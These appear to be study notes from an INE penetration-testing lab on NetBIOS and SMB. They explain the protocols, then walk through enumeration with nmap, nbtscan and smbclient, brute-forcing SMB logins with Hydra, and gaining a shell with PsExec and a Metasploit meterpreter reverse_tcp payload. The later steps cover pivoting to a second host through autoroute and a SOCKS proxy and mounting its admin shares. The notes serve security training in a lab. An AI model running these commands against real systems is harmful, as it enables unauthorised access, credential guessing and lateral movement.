- NetBIOS and SMB are two different technologies, but they're related in the context of networking and file sharing on Windows networks.
- Let's break down each of them to understand their roles and how they differ.

NetBIOS (Network Basic Input/Output System)
- NetBIOS is an API and a set of network protocols for providing communication services over a local network. It's used primarily to allow applications on different computers to find and interact with each other on a network.
- Functions: NetBIOS offers three primary services:
	- Name Service (NetBIOS-NS): Allows computers to register, unregister, and resolve names in a local network.
	- Datagram Service (NetBIOS-DGM): Supports connectionless communications and broadcasting.
	- Session Service (NetBIOS-SSN): Supports connection-oriented communication for more reliable data transfers.
- Ports: NetBIOS typically uses ports 137 (Name Service), 138 (Datagram Service), and 139 (Session Service) over UDP and TCP.

SMB (Server Message Block)
- SMB is a network file sharing protocol that allows computers on a network to share files, printers, and other resources. It is the primary protocol used in Windows networks for these purposes.
- Functions: SMB provides features for file and printer sharing, named pipes, and inter-process communication (IPC). It allows users to access files on remote computers as if they were present locally.
- Versions: SMB has several versions:
	- SMB 1.0: The original version of SMB, which has several security vulnerabilities. It was used with older operating systems like Windows XP.
	- SMB 2.0/2.1: Introduced with Windows Vista/Windows Server 2008, offering improved performance and security.
	- SMB 3.0+: Introduced with Windows 8, Windows Server 2012, adding features like encryption, multichannel support, and improvements for virtualization.
- Ports: SMB generally uses port 445 for direct SMB traffic (bypassing NetBIOS) and port 139 when operating with NetBIOS.

SMB & NetBIOS Enumeration
- While NetBIOS and SMB were once closely linked, modern networks rely primarily on SMB for file and printer sharing, often using DNS and other mechanisms for name resolution instead of NetBIOS.
- Modern implementations of Windows primarily use SMB and can work without NetBIOS, however, NetBIOS over TCP 139 is required for backward compatibility and are often enabled together.

Practical Demonstration
- Environment Description
	- `cat /etc/hosts`
	- There are two custom entries present in the `/etc/hosts` file, for this instance, we will use the example of `10.4.30.129    demo.ine.local` and `10.4.26.4    demo1.ine.local`. One of these entries, `demo.ine.local` (Target 1) is going to be accessible by the local system, whereas the other entry, `demo1.ine.local` (Target 2) present needs to be pivoted to from the first one, `demo.ine.local`.
	- `ping demo.ine.local`, this would result in successful data transmission, since the host is reachable.
	- `ping demo1.ine.local`, this would result in failure to transmit data, since the host is unreachable and needs to be pivoted to.
- Port Enumeration
	- `nmap demo.ine.local`
	- The following ports would be open on `demo.ine.local`: 135/tcp (MS-RPC), 139/tcp (NetBIOS-SSN), 445/tcp (SMB) and 3389/tcp (RDP).
	- We may remember that NetBIOS SSN runs on port 139/tcp and is used for connection-oriented communication.
	- `nmap -sU -p 137 demo.ine.local`, we did this to scan the UDP port 137 on the target machine to determine if the NetBIOS Name Service is running and reachable.
	- The 137/udp port is in the `open|filtered` state.
- NetBIOS Name Enumeration using `nbtscan`
	- `whatis nbtscan`
	- `ifconfig`, to determine the subnet of the first target machine we want to enumerate information about.
	- `nbtscan 10.4.30.0/24`
	- Alternatively if that doesn't work, we can use the `nbstat` Nmap script instead:
		- `nmap -sU -sV -T4 --script nbstat.nse -p 137 -Pn -n 10.4.30.139`
- NetBIOS Name Enumeration using `nmblookup`
	- `nmblookup -A 10.4.30.139`
- SMB Enumeration
	- Port Enumeration for NetBIOS-SSN and SMB:
		- `nmap -sV -p 139,445 demo.ine.local`
	- SMB Version Enumeration using Nmap scripts:
		- `ls -al /usr/share/nmap/scripts/ | grep -e "smb-*"`
		- `nmap -p445 --script smb-protocols demo.ine.local`
		- The scripts results tell us that the SMB version running on the target machine is SMBv1.
		- Some vulnerabilities relevant to SMBv1 are null sessions.
	- SMB Security Mode Enumeration using Nmap scripts:
		- `nmap -p445 --script smb-security-mode demo.ine.local`
		- The result of this script tells us the account used by Nmap to perform enumeration on the target machine, the authentication level used by the target SMB service (user or share level authentication), the challenge response state (password only or hash/key based authentication), and message signing state.
	- Testing for SMB Null Session (Anonymous Access) using `smbclient`
		- `smbclient -L demo.ine.local`
		- If entering no password leads to a successful login, we can confirm that anonymous access are enabled on the SMB service instance.
		- If a null session is present, we can use it to further enumerate the SMB service, the first things shown on screen upon successful authentication are the share names and the share types, this can help us enumerate information about the shares present on the SMB server, and check if any IPC shares are present on the server.
		- Enumerating Windows users using Nmap scripts:
			- If null sessions are present, we can also perform username enumeration on the windows machine, just through SMB, using the Nmap `smb-enum-user` script.
			- `nmap -p445 --script smb-enum-users 10.4.30.139`
			- The result of this script tells us the hostname of the Windows machine, along with the usernames of the accounts present on it.
			- The RID of the user can help us determine the type of the account, a RID value of 500 stands for an Administrator user account.
- Bruteforcing SMB user accounts using Hydra
			- `nano users.txt`
			- `echo "admin" >> users.txt`
			- `echo "administrator" >> users.txt`
			- `echo "root" >> users.txt`
			- `hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb`
- Authenticated Remote Code Execution using PsExec
	- `psexec.py administrator@demo.ine.local`
		- Password: `password1`
			- `whoami`
	- `msfconsole -q`
	- `search psexec`
	- `use exploit/windows/smb/psexec`
	- `show options`
	- `set RHOSTS demo.ine.local`
	- `set SMBUser administrator`
	- `set SMBPass password1`
	- `set payload windows/x64/meterpreter/reverse_tcp`
	- Meterpreter Session:
		- `sysinfo`
		- `shell`
		- Windows Command Shell on Target 1:
			- `ping 10.4.26.41` Verifying that Target 2 is accessible to us via the access we have on Target 1.
		- Setting up routing to use Target 1 as a pivoting point for Target 2:
			- `run autoroute -s 10.4.26.0/20`
		- `background`
	- Setting up a system-wide SOCKS proxy:
		- It would be beneficial to setup a system-wide proxy on the attack machine to ensure that we can use the route we set up earlier on tools except Metasploit.
		- Meterpreter Session from the previous section:
			- `search socks`
			- `use auxiliary/server/socks_proxy`
			- The values to be used for this module are based on the installation of proxychains we have installed on our attack box, and can be looked up in the configuration for that tool.
			- `set VERSION 4a`
			- `set SRVPORT 9050`
			- `exploit`
		- `netstat -antp`, we should now check for a ruby program listening on port 9050 to ensure that the system-wide proxy has been setup correctly and is working as required.
	- Enumeration on Target 2 using Target 1 as a pivot point:
		- Performing an Nmap scan on Target 2 using the system-wide proxy we set up earlier:
			- `proxychains nmap demo1.ine.local -sT -Pn -sV -p 445`
			- The Nmap scan informed us that SMB is up and running on Target 2.
		- `sessions`
		- `sessions 2`
		- Meterpreter Session from the previous section:
			- `shell`
			- Command Shell on Target 1:
				- `net view 10.4.26.4`, since we already know from the Nmap scan we conducted earlier on Target 2 that SMB is running on it, we can try to view the shared available to us as the user logged in on Target 1 via this command.
				- This resulted in a access is denied message, since we are already running as NT Authority, we can try migrating to another process to ensure it works.
			- `migrate -N explorer.exe`
			- `shell`
			- Command Shell on Target 1:
				- `net view 10.4.26.4`
				- `net use D: \\10.4.26.4\Documents`
				- `net use K: \\10.4.26.4\K$`
				- `dir D:`
				- `type FLAG2.txt`
				- `dir K:`